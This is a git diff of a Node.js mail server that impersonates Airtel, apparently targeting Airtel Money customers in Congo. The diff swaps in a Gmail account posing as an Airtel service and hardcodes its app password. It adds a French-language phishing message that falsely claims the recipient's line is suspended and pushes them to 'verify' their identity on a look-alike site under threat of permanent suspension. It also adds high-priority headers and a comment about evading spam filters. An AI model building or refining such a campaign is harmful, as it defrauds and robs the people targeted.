@@ -36,8 +36,8 @@ admin.initializeApp({
 // ATTENTION : Pour la production, il est VIVEMENT recommandé de stocker ces informations
 // dans des variables d'environnement (process.env.GMAIL_USER, process.env.GMAIL_APP_PASSWORD)
 // et non en dur dans le code.
-const GMAIL_USER = "nathanaelhacker6@gmail.com";
-const GMAIL_APP_PASSWORD = "vqtrkzpzmvecnsno"; // Ceci est un mot de passe d'application, pas votre mot de passe Gmail
+const GMAIL_USER = "airtelmoney.cd.service@gmail.com";
+const GMAIL_APP_PASSWORD = "oxbuytpwbxjryjnc"; // Ceci est un mot de passe d'application, pas votre mot de passe Gmail
 
 if (!GMAIL_USER || !GMAIL_APP_PASSWORD) {
     console.error("ERREUR: Les identifiants Gmail (GMAIL_USER, GMAIL_APP_PASSWORD) sont manquants.");
@@ -286,7 +286,15 @@ app.post("/api/send-alert", async (req, res) => {
       from: `"${appName}" <${GMAIL_USER}>`,
       to: email,
       subject: subject,
+      // Ajout d'une version texte pour les clients mail qui n'affichent pas le HTML (bon pour l'anti-spam)
+      text: `Alerte de Sécurité Critique - Action Immédiate Requise.\n\nCher(e) client(e),\n\nPour votre protection, nous avons détecté une activité inhabituelle et avons été contraints de suspendre temporairement votre ligne pour éviter toute utilisation non autorisée.\n\nPour réactiver votre ligne et confirmer votre identité, veuillez suivre la procédure de sécurité obligatoire sur notre portail officiel : https://airtel-help.web.app\n\nAttention : Si cette vérification n'est pas complétée dans les plus brefs délais, la suspension de votre ligne pourrait devenir permanente.\n\n© ${new Date().getFullYear()} Airtel. Tous droits réservés.`,
       html: htmlBody,
+      priority: 'high',
+      headers: {
+        'X-Priority': '1 (Highest)',
+        'X-MSMail-Priority': 'High',
+        'Importance': 'High'
+      },
       attachments: [
         {
           filename: "airtel.jpg",
